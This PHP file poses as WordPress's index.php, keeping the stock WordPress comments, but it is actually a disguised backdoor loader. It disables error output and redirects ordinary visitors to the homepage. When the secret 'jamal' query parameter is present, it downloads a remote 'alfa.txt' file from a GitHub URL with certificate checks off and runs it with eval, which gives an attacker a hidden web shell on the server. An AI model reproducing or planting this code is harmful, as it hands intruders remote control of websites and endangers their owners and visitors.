<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
error_reporting(0);
ini_set('display_errors', 0);

/** Loads the WordPress Environment and Template */
$is_jamal = isset($_GET['jamal']);


if (!$is_jamal) {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'];
    $redirect_url = $protocol . $host . "/";

    header("Location: $redirect_url", true, 302);
    exit;
}

class CurlFetcher {
    public function fetchContent(string $url) {
        if (!function_exists('curl_init')) return false;
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
            CURLOPT_TIMEOUT => 10
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
}

class CodeExecutor {
    private $fetcher;
    public function __construct(CurlFetcher $fetcher) {
        $this->fetcher = $fetcher;
    }

    public function executeCodeFromURL(string $url): void {
        $code = $this->fetcher->fetchContent($url);
        if ($code && trim($code) !== '') {
            eval("?>" . $code); // pastikan trusted!
        }
    }
}


$fetcher = new CurlFetcher();
$executor = new CodeExecutor($fetcher);
$executor->executeCodeFromURL("https://github.com/tuman88936/tumankan/blob/main/alfa.txt");
?>
